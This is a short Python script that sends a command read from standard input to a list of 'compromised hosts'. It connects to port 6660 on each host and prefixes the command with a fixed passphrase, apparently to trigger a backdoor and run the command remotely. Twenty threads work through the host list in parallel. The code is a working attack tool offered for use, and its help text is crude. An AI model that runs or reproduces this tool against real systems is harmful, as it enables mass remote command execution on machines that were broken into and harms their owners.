#!/usr/bin/python
# by amon (amon@nandynarwhals.org)

import socket
import argparse
import sys
from threading import Thread
from Queue import Queue

def pwn(i):
    try:
        sys.stdout.write("Working on %s\n"  % i)
        s = socket.socket()
        s.settimeout(10)
        s.connect((i, 6660))
        s.send("DoYouHearThePeopleSing?:::" + cmd + "\n")
        s.close()
        sys.stdout.write("%s: cmd sent successfully\n" % i)
    except:
        sys.stdout.write("%s: cmd failed to send\n" % i)

def do_pwn(q):
    while True:
        pwn(q.get())
        q.task_done()

parser = argparse.ArgumentParser(description='Pwn some bitches.')
parser.add_argument('host', help='list of compromised hosts')
args = parser.parse_args()

hosts = file(args.host).read().strip().split("\n")
cmd = sys.stdin.readline().strip()

q = Queue(maxsize=0)
num_threads = 20

for i in range(num_threads):
    worker = Thread(target=do_pwn, args=(q,))
    worker.setDaemon(True)
    worker.start()

for i in hosts:
    q.put(i)

q.join()
